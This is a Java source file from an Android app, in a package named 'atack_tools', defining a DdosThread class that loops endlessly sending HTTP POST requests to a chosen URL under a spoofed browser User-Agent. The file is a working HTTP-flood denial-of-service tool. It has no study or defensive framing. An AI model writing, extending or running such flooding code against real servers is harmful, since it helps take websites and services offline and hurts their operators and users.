package com.example.ipdownapp.atack_tools;

import android.os.Looper;
import android.os.MessageQueue;
import android.util.Log;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class DdosThread extends Thread{

    public static Notificable notificable;

    private static int autoId = 0;

    private int id;

    private AtomicBoolean running = new AtomicBoolean(true);
    private String request;
    private URL url;

    String param = null;

    public DdosThread(){
        this.id = ++autoId;
    }

    public void setRequestURL(String request) {
        this.request = request;
        try{
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }catch (Exception e){
        }
    }

    @Override
    public void run() {

        while (running.get()) {

            try {
                attack();
            } catch (Exception e) {
                notificar("Error de peticion");
            }
        }
    }

    public void attack() throws Exception {

        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Host", "localhost");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", param);

        notificar("Reponse code -> "+ connection.getResponseCode());

        connection.getInputStream();

    }


    private void notificar(String mensaje){


        notificable.getActivity().runOnUiThread(new Runnable() {
            @Override
            public void run() {
                notificable.notificar("Thread " + id + ": " + mensaje);
            }
        });


    }

}
